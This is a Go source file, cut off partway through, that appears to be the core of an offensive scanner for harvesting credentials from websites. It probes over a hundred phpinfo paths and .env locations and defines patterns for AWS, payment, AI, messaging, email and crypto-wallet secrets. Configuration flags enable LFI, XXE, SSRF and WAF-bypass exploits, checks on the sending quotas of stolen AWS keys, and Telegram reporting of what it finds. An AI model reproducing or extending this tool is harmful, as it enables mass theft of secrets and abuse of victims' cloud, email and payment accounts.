package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/fs"
	"io/ioutil"
	"net/http"
	"net/smtp"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"math/rand"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/credentials"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/aws/aws-sdk-go-v2/service/servicequotas"
	"github.com/aws/aws-sdk-go-v2/service/ses"
	"github.com/aws/aws-sdk-go-v2/service/sesv2"
	"github.com/aws/aws-sdk-go-v2/service/sesv2/types"
	"github.com/aws/aws-sdk-go-v2/service/sns"
	"github.com/aws/aws-sdk-go-v2/service/sts"
	"github.com/pterm/pterm"
)

var client *http.Client

const defaultConfigPath = "config.json"

var requestTimeoutSeconds int
var batchSize int

type Counters struct {
	mu               sync.Mutex
	URLsLoaded       int
	TokensHarvested  int
	TokensValidated  int
	CryptoKeysFound  int
	AWSKeysValidated int
	BrevoKeysFound   int
	APIsFoundTotal   int
	APIsValidated    int
	ValidSMTP        int
}

var globalCounters Counters

type Config struct {
	Telegram struct {
		BotToken string `json:"bot_token"`
		ChatID   string `json:"chat_id"`
	} `json:"telegram"`
	// Pindahkan fitur umum yang mengontrol proses scanning utama
	ScanningFeatures struct {
		AWSMainScan         bool `json:"aws_main_scan"`
		GitHubTokenDeepScan bool `json:"github_token_deep_scan"`
		SMTPCredentialsScan bool `json:"smtp_credentials_scan"`
	} `json:"scanning_features"`
	AWSChecks struct {
		SESQuotaCheck        bool `json:"ses_quota_check"`
		SNSLimitCheck        bool `json:"sns_limit_check"`
		FargateLimitCheck    bool `json:"fargate_limit_check"`
		FederationConsoleURL bool `json:"federation_console_url"`
	} `json:"aws_checks"`
	// Fitur yang mengontrol validasi API spesifik
	APIValidation struct {
		OpenAI      bool `json:"openai"`
		Anthropic   bool `json:"anthropic"`
		AIAll       bool `json:"ai_all"`
		Stripe      bool `json:"stripe"`
		GCPAPIKey   bool `json:"gcp_api_key"`
		SendGrid    bool `json:"sendgrid"`
		Mailgun     bool `json:"mailgun"`
		Twilio      bool `json:"twilio"`
		Nexmo       bool `json:"nexmo"`
		Telnyx      bool `json:"telnyx"`
		MessageBird bool `json:"messagebird"`
		GitHub      bool `json:"github"`
		Postmark    bool `json:"postmark"`
		SparkPost   bool `json:"sparkpost"`
		Mailtrap    bool `json:"mailtrap"`
		Mailjet     bool `json:"mailjet"`
		Heroku      bool `json:"heroku"`
		Datadog     bool `json:"datadog"`
		Plivo       bool `json:"plivo"`
		CryptoWallet bool `json:"crypto_wallet"`
	} `json:"api_validation"`
	// Fitur lama yang hanya mencari pola, bukan validasi, akan tetap diabaikan atau ditangani di logic lain
	Features struct { // Dibiarkan untuk pola yang tidak divalidasi, jika masih ada
		Brevo      bool `json:"brevo"`
		XSMTP      bool `json:"xsmtp"`
		Tencent    bool `json:"tencent"`
		Mailgun    bool `json:"mailgun"`
		NewMailgun bool `json:"new_mailgun"`
		Mandrill   bool `json:"mandrill"`
		MailerSend bool `json:"mailersend"`
		GitHub     bool `json:"github"`
		Twilio     bool `json:"twilio"`
		Nexmo      bool `json:"nexmo"`
		Telnyx     bool `json:"telnyx"`
		SMTP       bool `json:"smtp"`
	} `json:"features"`
	ExploitMethods struct {
		React2Shell      bool `json:"react2shell"`
		BypassWAF        bool `json:"bypass_waf"`
		BypassMiddleware bool `json:"bypass_middleware"`
		LFI              bool `json:"lfi"`
		XXE              bool `json:"xxe"`
		SSRF             bool `json:"ssrf"`
	} `json:"exploit_methods"`
	SMTPTestEmail string `json:"smtp_test_email"`
	EmailTarget   string `json:"email_target"`
	SessionName   string `json:"session_name"` // set by controller; used in Telegram notification headers
}

type Enhancer struct {
	client           *http.Client
	firebasePattern  *regexp.Regexp
	supabasePattern  *regexp.Regexp
	firebaseKeyPatt  *regexp.Regexp
	bearerPattern    *regexp.Regexp
	evalAtobPattern  *regexp.Regexp
	evalUnescapePatt *regexp.Regexp
	base64Candidate  *regexp.Regexp
	sitemapPattern   *regexp.Regexp
	scriptSrcPattern *regexp.Regexp
	urlParamPattern  *regexp.Regexp
}

type AWSScanner struct {
	Config           *Config
	BlacklistPattern *regexp.Regexp

	AWSAccessKeyPattern          *regexp.Regexp
	AWSSecretKeyPattern          *regexp.Regexp
	SendGridAPIKeyPattern        *regexp.Regexp
	BrevoAPIKeyPattern           *regexp.Regexp
	XSMTPAPIKeyPattern           *regexp.Regexp
	TencentAccessKeyPattern      *regexp.Regexp
	MailgunAPIKeyPattern         *regexp.Regexp
	MandrillAppAPIKeyPattern     *regexp.Regexp
	MailerSendAPIKeyPattern      *regexp.Regexp
	NewMailgunAPIKeyPattern      *regexp.Regexp
	GitHubAccessTokenPattern     *regexp.Regexp
	AWSRandomPattern             *regexp.Regexp
	AWSAccessKeyPatternInfo      *regexp.Regexp
	AWSSecretKeyPatternInfo      *regexp.Regexp
	SendGridAPIKeyPatternInfo    *regexp.Regexp
	MailgunAPIKeyPatternInfo     *regexp.Regexp
	GitHubAccessTokenPatternInfo *regexp.Regexp
	TwilioSIDPatternInfo         *regexp.Regexp
	TwilioAuthPatternInfo        *regexp.Regexp
	TwilioAuthPatternV2Info      *regexp.Regexp
	TwilioEncodePatternInfo      *regexp.Regexp
	NexmoApiPatternInfo          *regexp.Regexp
	NexmoSecretPatternInfo       *regexp.Regexp
	TelnyxApiPatternInfo         *regexp.Regexp
	SMSGatewayPattern            *regexp.Regexp
	DBCredentialsPattern         *regexp.Regexp
	StripePattern                *regexp.Regexp
	ETHPrivateKeyPattern         *regexp.Regexp
	ETHAddressPattern            *regexp.Regexp
	OpenAIAPIPattern             *regexp.Regexp
	AnthropicPattern             *regexp.Regexp
	MessageBirdPattern           *regexp.Regexp
	MailValPattern               *regexp.Regexp
	SMTPHostPattern              *regexp.Regexp
	SMTPPortPattern              *regexp.Regexp
	SMTPUserPattern              *regexp.Regexp
	SMTPPassPattern              *regexp.Regexp
	SMTPFromPattern              *regexp.Regexp
	AWSSMTPHostPattern           *regexp.Regexp

	AzureSASTokenPattern   *regexp.Regexp
	GCPAPIKeyPattern       *regexp.Regexp
	AliyunAccessKeyPattern *regexp.Regexp
	AliyunSecretKeyPattern *regexp.Regexp

	AWSSessionTokenPattern *regexp.Regexp
	AWSSESUserPattern      *regexp.Regexp
	AWSSecretV2KeyPattern  *regexp.Regexp

	// ── New (Wave-5) credential patterns ──────────────────────────────────
	SlackBotTokenPattern    *regexp.Regexp
	SlackUserTokenPattern   *regexp.Regexp
	SlackWebhookPattern     *regexp.Regexp
	DiscordBotTokenPattern  *regexp.Regexp
	DiscordWebhookPattern   *regexp.Regexp
	CloudflareTokenPattern  *regexp.Regexp
	CloudflareGlobalPattern *regexp.Regexp
	DigitalOceanPATPattern  *regexp.Regexp
	HerokuAPIKeyPattern     *regexp.Regexp
	DatadogAPIKeyPattern    *regexp.Regexp
	SentryDSNPattern        *regexp.Regexp
	NpmTokenPattern         *regexp.Regexp
	PyPITokenPattern        *regexp.Regexp
	GitLabPATPattern        *regexp.Regexp
	JWTPattern              *regexp.Regexp
	PostmarkAPIKeyPattern   *regexp.Regexp
	SparkPostAPIKeyPattern  *regexp.Regexp
	MailtrapAPIKeyPattern   *regexp.Regexp
	MailjetAPIKeyPattern    *regexp.Regexp
	MailjetSecretKeyPattern *regexp.Regexp
	PlivoAuthIDPattern      *regexp.Regexp
	PlivoAuthTokenPattern   *regexp.Regexp
	AWSSNSTopicARNPattern   *regexp.Regexp

	// SMTP Service Patterns
	SocketLabsSMTPPattern   *regexp.Regexp
	SparkPostSMTPPattern    *regexp.Regexp
	PostmarkSMTPPattern     *regexp.Regexp
	RackspaceSMTPPattern    *regexp.Regexp
	MailjetSMTPPattern      *regexp.Regexp
	MailgunSMTPPattern      *regexp.Regexp
	MailgunEUSMTPPattern    *regexp.Regexp
	ZeptoMailSMTPPattern    *regexp.Regexp
	GmailSMTPPattern        *regexp.Regexp
	MandrillSMTPPattern     *regexp.Regexp
	Office365SMTPPattern    *regexp.Regexp
	BrevoSMTPPattern        *regexp.Regexp
	ElasticEmailSMTPPattern *regexp.Regexp
	SendinBlueSMTPPattern   *regexp.Regexp
	KagoyaSMTPPattern       *regexp.Regexp

	RealCryptoPatterns []*regexp.Regexp

	DefaultRegion string
	PHPInfoPaths  []string
	EnvPaths      []string

	ValidKeyLimits sync.Map
	KnownKeys      sync.Map
	SentTelegrams  sync.Map // Tracking pesan telegram yang sudah dikirim
	VisitedURLs    sync.Map // Tracking URL yang sudah di-scan untuk prevent duplicate
	TempDir        string

	ProgressBar *pterm.ProgressbarPrinter
}

type TruffleHogResult struct {
	SourceMetadata struct {
		Data struct {
			Commit string `json:"commit"`
			Email  string `json:"email"`
			File   string `json:"file"`
		} `json:"Data"`
		SourceDetails struct {
			Repository string `json:"Repository"`
		} `json:"SourceDetails"`
	} `json:"SourceMetadata"`
	DetectorName string `json:"DetectorName"`
	Verified     bool   `json:"Verified"`
	Secret       string `json:"Secret"`
}

type GitleaksResult struct {
	Description string `json:"Description"`
	Secret      string `json:"Secret"`
	RuleID      string `json:"RuleID"`
	File        string `json:"File"`
	Commit      string `json:"Commit"`
	Message     string `json:"Message"`
}

var base64CandidatePattern = regexp.MustCompile(`[a-zA-Z0-9+/=_-]{40,}`)

func tryDecodeBase64(s string) string {
	re := regexp.MustCompile(`[^a-zA-Z0-9+/=_-]`)
	cleaned := re.ReplaceAllString(s, "")

	if len(cleaned) < 40 {
		return ""
	}

	standardized := strings.ReplaceAll(cleaned, "-", "+")
	standardized = strings.ReplaceAll(standardized, "_", "/")

	switch len(standardized) % 4 {
	case 2:
		standardized += "=="
	case 3:
		standardized += "="
	}

	decodedBytes, err := base64.StdEncoding.DecodeString(standardized)
	if err == nil {
		if isPrintableText(decodedBytes) {
			return string(decodedBytes)
		}
	}
	return ""
}

func isPrintableText(data []byte) bool {
	if len(data) == 0 {
		return false
	}
	nonPrintableCount := 0
	for _, b := range data {
		if (b < 32 || b > 126) && b != 9 && b != 10 && b != 13 {
			nonPrintableCount++
		}
	}
	return float64(nonPrintableCount)/float64(len(data)) < 0.3
}

func countLines(filename string) (int, error) {
	file, err := os.Open(filename)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	buf := make([]byte, 32*1024)
	count := 0
	lineSep := []byte{'\n'}

	for {
		c, err := file.Read(buf)
		count += bytes.Count(buf[:c], lineSep)

		switch {
		case err == io.EOF:
			return count, nil
		case err != nil:
			return count, err
		}
	}
}

func loadConfig(path string) (*Config, error) {
	b, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var cfg Config
	// Menggunakan json.Unmarshal untuk memuat konfigurasi
	if err := json.Unmarshal(b, &cfg); err != nil {
		return nil, err
	}
	// Perlu juga memuat konfigurasi lama untuk compatibility
	// (Walaupun di versi ini kita hanya fokus pada struktur baru,
	// ini penting jika ada field yang terpisah)
	var tempConfig map[string]interface{}
	if err := json.Unmarshal(b, &tempConfig); err != nil {
		return nil, err
	}
	// Beberapa fitur lama di 'features' perlu di mapping ke struct baru jika ada
	// Contoh: jika fitur lama masih ada di config.json dan perlu dipertahankan
	// (meskipun di JSON baru kita sudah memisahkannya)
	if f, ok := tempConfig["features"].(map[string]interface{}); ok {
		if val, ok := f["brevo"].(bool); ok {
			cfg.Features.Brevo = val
		}
		// Ulangi untuk fitur lama lainnya jika diperlukan
	}

	return &cfg, nil
}

func NewEnhancer(client *http.Client) *Enhancer {
	return &Enhancer{
		client:           client,
		firebasePattern:  regexp.MustCompile(`(?i)apiKey\s*[:=]\s*["'](AIza[0-9A-Za-z-_]{35})["']`),
		supabasePattern:  regexp.MustCompile(`(?i)SUPABASE_URL\s*[:=]\s*["'](https?://[\w.-]+)/?`),
		firebaseKeyPatt:  regexp.MustCompile(`(?i)firebaseConfig\s*=\s*\{[\s\S]{0,800}?apiKey\s*[:=]\s*["'](AIza[0-9A-Za-z-_]{35})["']`),
		bearerPattern:    regexp.MustCompile(`(?i)Bearer\s+([A-Za-z0-9\-_.=]{20,300})`),
		evalAtobPattern:  regexp.MustCompile(`eval\(atob\(['\"]([A-Za-z0-9\+/=_-]{20,})['\"]\)\)`),
		evalUnescapePatt: regexp.MustCompile(`eval\(unescape\(['\"](%[0-9A-Fa-f]{2}|\\x[0-9A-Fa-f]{2})+['\"]\)\)`),
		base64Candidate:  regexp.MustCompile(`[a-zA-Z0-9+/=_-]{40,}`),
		sitemapPattern:   regexp.MustCompile(`(?i)<loc>(https?://[^<]+)</loc>`),
		scriptSrcPattern: regexp.MustCompile(`(?i)<script[^>]+src=["']([^"']+)["']`),
		urlParamPattern:  regexp.MustCompile(`[?&]([A-Za-z0-9_\-\.]+)=([A-Za-z0-9%_\-\./:+@\s]{8,200})`),
	}
}

func NewAWSScanner(configPath string) *AWSScanner {
	cfg, err := loadConfig(configPath)
	if err != nil {
		pterm.Error.Printf("Failed to load config: %v. Make sure config.json exists.\n", err)
		os.Exit(1)
	}

	client = &http.Client{
		Timeout: time.Duration(requestTimeoutSeconds) * time.Second * 2,
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:        1000,
			MaxIdleConnsPerHost: 1000,
			DisableKeepAlives:   true,
		},
	}

	tempDir := "temp_repos"
	os.MkdirAll(tempDir, 0755)

	blacklist := []string{"cloudflare", "bootstrap", "jquery", "/wp-content/", "/jwplayer.js", "awstatic"}
	blacklistPattern := regexp.MustCompile(strings.Join(blacklist, "|"))

	phpinfoPaths := []string{
		"/info",
		"/phpinfo",
		"/phpinfo.php",
		"/info.php",
		"/_profiler/phpinfo",
		"/php.php",
		"/test.php",
		"/i.php",
		"/asdf.php",
		"/phpversion.php",
		"/temp.php",
		"/old/phpinfo.php",
		"/infophp.php",
		"/server/php",
		"/php/info.php",
		"/php/phpinfo.php",
		"/test/phpinfo.php",
		"/demo/phpinfo.php",
		"/site/phpinfo.php",
		"/tmp/phpinfo.php",
		"/dev/phpinfo.php",
		"/local/phpinfo.php",
		"/backend/phpinfo.php",
		"/blog/phpinfo.php",
		"/_profiler/info",
		"/server-status",
		"/index.php?page=phpinfo",
		"/index.php?view=phpinfo",
		"/index.php?action=phpinfo",
		"/index.php?do=phpinfo",
		"/index.php?mode=phpinfo",
		"/index.php?phpinfo=1",
		"/index.php?=phpinfo()",
		"/index.php?=-phpinfo()",
		"/?=phpinfo",
		"/?phpinfo=1",
		"/?page=phpinfo",
		"/test/php.php",
		"/test/info.php",
		"/test/index.php",
		"/test/testing.php",
		"/testing/phpinfo.php",
		"/testing/info.php",
		"/testing/php.php",
		"/php-info.php",
		"/php_info.php",
		"/info/php.php",
		"/info/info.php",
		"/info/phpinfo.php",
		"/phpinfo/info.php",
		"/phpinfo/test.php",
		"/server-info.php",
		"/server_info.php",
		"/tests/phpinfo.php",
		"/tests/info.php",
		"/admin/phpinfo.php",
		"/admin/info.php",
		"/admin/php.php",
		"/admin/php_info.php",
		"/admin/php-info.php",
		"/administrator/phpinfo.php",
		"/administrator/info.php",
		"/web/phpinfo.php",
		"/web/info.php",
		"/web/php.php",
		"/_inc/phpinfo.php",
		"/includes/phpinfo.php",
		"/include/phpinfo.php",
		"/inc/phpinfo.php",
		"/core/phpinfo.php",
		"/core/info.php",
		"/app/phpinfo.php",
		"/apps/phpinfo.php",
		"/upload/phpinfo.php",
		"/uploads/phpinfo.php",
		"/exported/phpinfo.php",
		"/backup/phpinfo.php",
		"/back/phpinfo.php",
		"/bak/phpinfo.php",
		"/.backup/phpinfo.php",
		"/_backup/phpinfo.php",
		"/beta/phpinfo.php",
		"/old/info.php",
		"/2020/phpinfo.php",
		"/2021/phpinfo.php",
		"/2022/phpinfo.php",
		"/2023/phpinfo.php",
		"/2024/phpinfo.php",
		"/v1/phpinfo.php",
		"/v2/phpinfo.php",
		"/v3/phpinfo.php",
		"/api/phpinfo.php",
		"/api/info.php",
		"/api/v1/phpinfo.php",
		"/api/v2/phpinfo.php",
		"/apis/phpinfo.php",
		"/site-info.php",
		"/server.php",
		"/host.php",
		"/host-info.php",
		"/status.php",
		"/system.php",
		"/system/info.php",
		"/sys/info.php",
		"/sys/phpinfo.php",
		"/.php",
		"/1.php",
		"/x.php",
		"/xx.php",
		"/xxx.php",
		"/db.php",
		"/database.php",
		"/home.php",
		"/default.php",
		"/conf.php",
		"/config.php",
		"/configuration.php",
		"/_test.php",
		"/_phpinfo.php",
		"/__test.php",
		"/__phpinfo.php",
	}
	envPaths := loadEnvPaths()

	realCryptoPatterns := []*regexp.Regexp{
		// Hanya mnemonic seed phrase (12-24 words)
		regexp.MustCompile(`(?i)(?:mnemonic|seed_phrase|recovery_phrase|backup_phrase|wallet_seed|secret_recovery_phrase)\s*[=:]\s*["\']?([a-z]+(?:\s+[a-z]+){11,23})["\']?`),
	}

	return &AWSScanner{
		Config:                       cfg,
		BlacklistPattern:             blacklistPattern,
		AWSAccessKeyPattern:          regexp.MustCompile(`['"](AKIA[0-9A-Z]{16})['"]`),
		AWSSecretKeyPattern:          regexp.MustCompile(`['"]([A-Za-z0-9/+=]{40})['"]`),
		SendGridAPIKeyPattern:        regexp.MustCompile(`SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}`),
		BrevoAPIKeyPattern:           regexp.MustCompile(`xkeysib-[a-zA-Z0-9]{64}-[a-zA-Z0-9]{16}`),
		XSMTPAPIKeyPattern:           regexp.MustCompile(`xsmtpsib-[a-fA-F0-9]{64}-[a-zA-Z0-9]{16}`),
		TencentAccessKeyPattern:      regexp.MustCompile(`['"]AKID[a-zA-Z0-9]{32}['"]`),
		MailgunAPIKeyPattern:         regexp.MustCompile(`key-[0-9a-zA-Z]{32}`),
		MandrillAppAPIKeyPattern:     regexp.MustCompile(`['"]md-[0-9a-zA-Z]{22}['"]`),
		MailerSendAPIKeyPattern:      regexp.MustCompile(`mlsn.-[0-9a-zA-Z]{70}`),
		NewMailgunAPIKeyPattern:      regexp.MustCompile(`[a-f0-9]{32}-[0-9a-f]{8}-[a-f0-9]{8}`),
		GitHubAccessTokenPattern:     regexp.MustCompile(`(gh[oprus]_[A-Za-z0-9]{36}|github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59})`),
		TwilioSIDPatternInfo:         regexp.MustCompile(`AC[a-f0-9]{32}`),
		TwilioAuthPatternInfo:        regexp.MustCompile(`(?i)['"']?([0-9a-f]{32})['"']?`),
		TwilioAuthPatternV2Info:      regexp.MustCompile(`(?i)<td class="v">([0-9a-f]{32})</td>`),
		TwilioEncodePatternInfo:      regexp.MustCompile(`QU[MN][A-Za-z0-9]{87}==`),
		NexmoApiPatternInfo:          regexp.MustCompile(`(?i)(NEXMO_API_KEY|VONAGE_API_KEY)\s*[:=]\s*["']?([a-zA-Z0-9]{8})["\']?`),
		NexmoSecretPatternInfo:       regexp.MustCompile(`(?i)(NEXMO_API_SECRET|VONAGE_API_SECRET)\s*[:=]\s*["\']?([a-zA-Z0-9]{16})["\']?`),
		TelnyxApiPatternInfo:         regexp.MustCompile(`KEY[A-Z0-9]{32}_[A-Za-z0-9]{22}`),
		AWSRandomPattern:             regexp.MustCompile(`email-smtp\.[a-z0-9\-]+\.amazonaws\.com`),
		AWSSMTPHostPattern:           regexp.MustCompile(`(?i)(email-smtp\.[a-z0-9\-]+\.amazonaws\.com)`),
		DefaultRegion:                "us-east-1",
		AWSAccessKeyPatternInfo:      regexp.MustCompile(`AKIA[0-9A-Z]{16}`),
		AWSSecretKeyPatternInfo:      regexp.MustCompile(`[A-Za-z0-9/+=]{40}`),
		SendGridAPIKeyPatternInfo:    regexp.MustCompile(`SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}`),
		MailgunAPIKeyPatternInfo:     regexp.MustCompile(`key-[0-9a-zA-Z]{32}`),
		GitHubAccessTokenPatternInfo: regexp.MustCompile(`(gh[oprus]_[A-Za-z0-9]{36}|github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59})`),
		// Stripe key formats: secret (sk_*) and restricted (rk_*) only.
		// Publishable keys (pk_live_/pk_test_) are intentionally public — excluded to avoid noise.
		StripePattern:                regexp.MustCompile(`(sk_live_|sk_test_|rk_live_|rk_test_)[0-9a-zA-Z]{16,99}`),
		// ETH/EVM private key: 64 hex chars, often prefixed 0x. Match labeled occurrences only
		// to keep false positives down (any 64-hex string would otherwise match git SHAs, etc.).
		ETHPrivateKeyPattern: regexp.MustCompile(`(?i)(?:PRIVATE[_-]?KEY|ETH[_-]?PRIVATE[_-]?KEY|WALLET[_-]?PRIVATE[_-]?KEY|PRIVKEY)\s*[:=]\s*["']?(0x[a-fA-F0-9]{64}|[a-fA-F0-9]{64})["']?`),
		ETHAddressPattern:    regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
		OpenAIAPIPattern:             regexp.MustCompile(`sk-[a-zA-Z0-9]{48}`),
		AnthropicPattern:             regexp.MustCompile(`sk-ant-[a-zA-Z0-9]{32}-[a-zA-Z0-9]{64}`),
		MessageBirdPattern:           regexp.MustCompile(`(AccessKey|TestKey)_[a-zA-Z0-9]{32}`),
		PHPInfoPaths:                 phpinfoPaths,
		EnvPaths:                     envPaths,
		SMTPHostPattern:              regexp.MustCompile(`(?i)MAIL_HOST\s*[:=]\s*([^\s'"]+)`),
		SMTPPortPattern:              regexp.MustCompile(`(?i)MAIL_PORT\s*[:=]\s*([0-9]+)`),
		SMTPUserPattern:              regexp.MustCompile(`(?i)MAIL_USERNAME\s*[:=]\s*([^\s'"]+)`),
		SMTPPassPattern:              regexp.MustCompile(`(?i)MAIL_PASSWORD\s*[:=]\s*([^\s'"]+)`),
		SMTPFromPattern:              regexp.MustCompile(`(?i)MAIL_FROM\s*[:=]\s*([^\s'"]+)`),
		SMSGatewayPattern:            regexp.MustCompile(`(?i)(?P<service>twilio|vonage|aliyun|smsastral|infobip|nexmo|clickatell|talk2all).*?(?:api[_-]?key|login|username)[\s:=]+(?P<username>[A-Za-z0-9_-]+).*?(?:secret|password|token)[\s:=]+(?P<password>[A-Za-z0-9_-]+)`),
		DBCredentialsPattern:         regexp.MustCompile(`(?i)(?P<db>mysql|maria(?:db)?|mongodb|phpmyadmin)[\s:]*://(?P<username>[a-zA-Z0-9_.+-]+):(?P<password>[^@]+)@(?P<host>[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::(?P<port>\d+))?`),
		MailValPattern:               regexp.MustCompile(`(?i)(?P<service>zerobounce|neverbounce|bouncer)[\s:=]+(?P<apikey>[A-Za-z0-9_-]{16,64})`),
		AzureSASTokenPattern:         regexp.MustCompile(`(?i)sig=[a-zA-Z0-9%]+&se=[a-zA-Z0-9%]+&sr=[a-zA-Z]+&sp=[a-zA-Z]+&sv=[a-zA-Z0-9.]+`),
		GCPAPIKeyPattern:             regexp.MustCompile(`AIza[0-9A-Za-z-_]{35}`),
		AliyunAccessKeyPattern:       regexp.MustCompile(`(?i)LTAI[A-Z0-9]{16}`),
		AliyunSecretKeyPattern:       regexp.MustCompile(`(?i)[A-Za-z0-9]{30}`),
		AWSSecretV2KeyPattern:        regexp.MustCompile(`<td class="v">([0-9a-zA-Z\/+]{40})<\/td>`),

		AWSSessionTokenPattern: regexp.MustCompile(`['"]([A-Za-z0-9/+=]{256,})['"]`),
		AWSSESUserPattern:      regexp.MustCompile(`(AKIA|ASIA)[A-Z0-9]{16}`),

		// ── New (Wave-5) credential patterns ──────────────────────────────
		// Slack — bot (xoxb-), user (xoxp-), legacy (xoxa-/xoxr-/xoxs-), webhooks
		SlackBotTokenPattern:  regexp.MustCompile(`xoxb-[0-9]{10,}-[0-9]{10,}-[A-Za-z0-9]{20,}`),
		SlackUserTokenPattern: regexp.MustCompile(`xox[parsi]-[0-9]{8,}-[0-9]{8,}-[A-Za-z0-9]{20,}`),
		SlackWebhookPattern:   regexp.MustCompile(`https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]{20,}`),
		// Discord — bot token (3 base64 parts), webhook URLs
		DiscordBotTokenPattern: regexp.MustCompile(`[MN][A-Za-z0-9_-]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}`),
		DiscordWebhookPattern:  regexp.MustCompile(`https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d{17,20}/[\w-]{60,80}`),
		// Cloudflare — scoped tokens & legacy global keys
		CloudflareTokenPattern:  regexp.MustCompile(`[A-Za-z0-9_-]{40}`), // narrow via context elsewhere (Bearer + cloudflare)
		CloudflareGlobalPattern: regexp.MustCompile(`(?i)cloudflare[^\n]*[:=]([a-f0-9]{37})`),
		// DigitalOcean Personal Access Token
		DigitalOceanPATPattern: regexp.MustCompile(`dop_v1_[a-f0-9]{64}`),
		// Heroku API key (UUIDv4)
		HerokuAPIKeyPattern: regexp.MustCompile(`(?i)heroku[^\n]*[:=]\s*([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})`),
		// Datadog API key (32 hex)
		DatadogAPIKeyPattern: regexp.MustCompile(`(?i)(?:dd[-_]?api[-_]?key|datadog[^\n]*api[^\n]*key)[\s:=]+([0-9a-f]{32})`),
		// Sentry DSN
		SentryDSNPattern: regexp.MustCompile(`https://[a-f0-9]{32}@(?:[a-z0-9.-]+\.)?ingest\.sentry\.io/\d+`),
		// NPM token
		NpmTokenPattern: regexp.MustCompile(`npm_[A-Za-z0-9]{36}`),
		// PyPI token
		PyPITokenPattern: regexp.MustCompile(`pypi-[A-Za-z0-9_-]{50,}`),
		// GitLab PAT (classic and personal)
		GitLabPATPattern: regexp.MustCompile(`glpat-[A-Za-z0-9_-]{20,}`),
		// JWT — three base64url-encoded parts
		JWTPattern: regexp.MustCompile(`eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`),
		// Postmark server token (UUID format)
		PostmarkAPIKeyPattern: regexp.MustCompile(`(?i)(?:POSTMARK_SERVER_TOKEN|postmark[^\n]*server[^\n]*token)[\s:="']+([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})`),
		// SparkPost API key (40 hex chars)
		SparkPostAPIKeyPattern: regexp.MustCompile(`(?i)(?:sparkpost[_-]?(?:api[_-]?)?key|SPARKPOST_API_KEY)["'\s:=]+([a-f0-9]{40})`),
		// Mailtrap API token (32 hex chars)
		MailtrapAPIKeyPattern: regexp.MustCompile(`(?i)(?:mailtrap[_-]?(?:api[_-]?)?(?:token|key)|MAILTRAP_API_TOKEN)["'\s:=]+([a-f0-9]{32})`),
		// Mailjet — API key and secret key (each 32 hex chars)
		MailjetAPIKeyPattern:    regexp.MustCompile(`(?i)(?:MAILJET_API_KEY|MAILJET_PUBLIC_KEY|mailjet[^\n]*(?:api[_-]?key|public[_-]?key))[\s:="']+([0-9a-f]{32})`),
		MailjetSecretKeyPattern: regexp.MustCompile(`(?i)(?:MAILJET_API_SECRET|MAILJET_SECRET_KEY|mailjet[^\n]*(?:api[_-]?secret|secret[_-]?key))[\s:="']+([0-9a-f]{32})`),
		// Plivo Auth ID (starts with MA or SA, 20 chars) and Auth Token (40 alphanum)
		PlivoAuthIDPattern:    regexp.MustCompile(`(?i)(?:plivo[_-]?(?:auth[_-]?)?(?:id|sid))["'\s:=]+([MS]A[A-Z0-9]{18})`),
		PlivoAuthTokenPattern: regexp.MustCompile(`(?i)(?:PLIVO_AUTH_TOKEN|plivo[_-]?auth[_-]?token)["'\s:=]+([a-zA-Z0-9]{40})`),
		// AWS SNS topic ARNs (intel — feeds the SNS limit check)
		AWSSNSTopicARNPattern: regexp.MustCompile(`arn:aws:sns:[a-z0-9-]+:\d{12}:[A-Za-z0-9_-]+`),

		// SMTP Service Patterns
		SocketLabsSMTPPattern:   regexp.MustCompile(`smtp\.socketlabs\.com`),
		SparkPostSMTPPattern:    regexp.MustCompile(`smtp\.sparkpostmail\.com`),
		PostmarkSMTPPattern:     regexp.MustCompile(`smtp\.postmarkapp\.com`),
		RackspaceSMTPPattern:    regexp.MustCompile(`secure\.emailsrvr\.com`),
		MailjetSMTPPattern:      regexp.MustCompile(`in-v3\.mailjet\.com`),
		MailgunSMTPPattern:      regexp.MustCompile(`smtp\.mailgun\.org`),
		MailgunEUSMTPPattern:    regexp.MustCompile(`smtp\.eu\.mailgun\.org`),
		ZeptoMailSMTPPattern:    regexp.MustCompile(`smtp\.zeptomail\.com`),
		GmailSMTPPattern:        regexp.MustCompile(`smtp-relay\.gmail\.com`),
		MandrillSMTPPattern:     regexp.MustCompile(`smtp\.mandrillapp\.com`),
		Office365SMTPPattern:    regexp.MustCompile(`smtp\.office365\.com`),
		BrevoSMTPPattern:        regexp.MustCompile(`smtp\-relay\.brevo\.com`),
		ElasticEmailSMTPPattern: regexp.MustCompile(`smtp\.elasticemail\.com`),
		SendinBlueSMTPPattern:   regexp.MustCompile(`smtp\-relay\.sendinblue\.com`),
		KagoyaSMTPPattern:       regexp.MustCompile(`smtp\.kagoya\.net`),

		RealCryptoPatterns: realCryptoPatterns,
		ValidKeyLimits:     sync.Map{},
		KnownKeys:          sync.Map{},
		SentTelegrams:      sync.Map{},
		VisitedURLs:        sync.Map{},
		TempDir:            tempDir,
	}
}

func (e *Enhancer) EnhanceScanner(a *AWSScanner) {
	ePatterns := []*regexp.Regexp{
